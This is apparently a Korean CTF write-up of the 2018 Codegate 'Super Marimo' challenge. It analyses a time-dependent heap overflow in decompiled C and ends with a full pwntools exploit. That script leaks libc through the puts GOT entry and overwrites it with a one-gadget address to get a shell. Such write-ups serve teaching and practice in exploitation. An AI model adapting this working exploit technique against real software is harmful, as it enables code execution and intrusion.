---
title: "2018 Codegate Super Marimo"
date: 2019-12-23
tags: [Codegate]
categories: [Codegate]
---

64bit heap overflow 문제다. 변수랑 함수 이름은 내가 수정해놨다.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

이 프로그램에서 hidden function이 존재했다. 

```c
signed __int64 __fastcall vuln(const char *a1)
{
  void *v1; // ST18_8

  if ( strcmp(a1, "show me the marimo") )
    return 0LL;
  v1 = malloc(24uLL);
  sub_400EED(v1, 1u, 5u);
  Marimo[Marimo_cnt++] = v1;
  return 1LL;
}
```

여기서 보면 show me the marimo라는 글자랑 같으면 Marimo를 생성해줄 수 있다.

또 다른 곳에서 만들 수 있긴한데 돈이 필요하다고 떠서 그냥 호출하는 함수는 똑같다.

```c
_BYTE *__fastcall sub_400EED(struct marimo *a1, unsigned int a2, unsigned int a3)
{
  unsigned __int64 v3; // ST00_8
  int v4; // ST04_4

  v3 = __PAIR__(a2, a3);
  *&a1->birth = time(0LL);
  *&a1[1].name = a2;
  *&a1[2].profile = malloc(16uLL);
  puts("What's your new marimo's name? (0x10)");
  printf(">> ", v3);
  fflush(stdout);
  __isoc99_scanf("%16s", *&a1[2].profile);
  *&a1[5].name = malloc(32 * v4);
  printf("write %s's profile. (0x%X)\n", *&a1[2].profile, (32 * v4));
  fflush(stdout);
  printf(">> ");
  fflush(stdout);
  return sub_400FF9(*&a1[5].name, 32 * v4);
}
```

이런식으로 구조체 변수에 넣어서 Marimo를 만들어준다.

보기 쉽게 구조체는 이런식으로 만들어줬다. 

![](https://user-images.githubusercontent.com/32904385/71411403-7fd27f80-268c-11ea-9293-9caee4bc6f31.png)

취약점은 여기서 터진다.

```c
unsigned __int64 __fastcall Modify(struct marimo *a1)
{
  unsigned int v1; // ST18_4
  unsigned int v3; // [rsp+1Ch] [rbp-24h]
  char v4; // [rsp+20h] [rbp-20h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts(&byte_4014F4);
  printf("birth : %d\n", *&a1->birth);
  v1 = time(0LL);
  printf("current time : %d\n", v1);
  v3 = v1 + *&a1[1].name - *&a1->birth;
  printf("size : %d\n", v3);
  printf("price : %d\n", 5 * v3);
  printf("name : %s\n", *&a1[2].profile);
  printf("profile : %s\n", *&a1[5].name);
  puts(&byte_4014F4);
  puts("[M]odify / [B]ack ?");
  printf(">> ");
  fflush(stdout);
  __isoc99_scanf("%19s", &v4);
  if ( v4 == 'M' )
  {
    puts("Give me new profile");

    printf(">> ", &v4);
    fflush(stdout);
    sub_400FF9(*&a1[5].name, 32 * v3);          // vuln
    Modify(a1);
  }
  return __readfsqword(0x28u) ^ v5;
}
```

32 * 흐른 시간만큼의 크기로 수정해줄 수 있다. 그래서 여기서 흐른시간을 늘려서 Overflow 일으켜서 함수 포인터를 바꿀 수 있다. 

```
payload : buf[56] + puts_got(profile) + puts_got(name)
```

Marimo를 두개 만들어서 첫 번째 Marimo를 오버플로우나게 해서 puts_got를 Marimo의 name값을 가르키는 포인터에 넣고 view해주면 leak해줄 수 있어서 립씨 베이스를 구할 수 있다.

libc leak해줬으면 oneshot을 이용해서 modify해서 Marimo의 profile을 가르키는 포인터에 oneshot 주소를 구해서 got overwrite 해주면 된다.  `sub_400FF9` 함수에 의해서 개행전까지 입력받을 수 있다.

![](https://user-images.githubusercontent.com/32904385/71410643-6da31200-2689-11ea-856d-14e8dbacef8e.png)

'A'를 40개 입력했을 때 이런식으로 되는데 `0x15e015000` 을 덮지 않고 `0xc5c4c0` 을 바꿔줘야한다. 덮으면 나중에 수정부분에서 입력을 안 받고 프로그램이 꺼진다.

> exploit.py

```python
from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./marimo')
e = ELF('./marimo')
libc = e.libc

def vuln(name,profile):
	p.sendlineafter('>> ','show me the marimo')
	p.sendlineafter('>> ',name)
	p.sendlineafter('>> ',profile)

def view(index):
	p.sendlineafter('>> ','V')
	p.sendlineafter('>> ',str(index))

def modify(profile):
	p.sendlineafter('>> ','M')
	p.sendlineafter('>> ',profile)
	p.sendlineafter('>> ','B')

vuln('AAAA','BBBB')
vuln('CCCC','DDDD')

sleep(3)
payload = 'A'*48
payload += p64(0x15e015000)
payload += p64(e.got['puts']) # name
payload += p64(e.got['puts']) # profile

view(0)
modify(payload)
#raw_input()
view(1)
p.recvuntil('name : ')
libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

p.sendlineafter('>> ','M')
p.sendlineafter('>> ',p64(libc_base + 0x45216)) # puts overwrite
p.interactive()
```

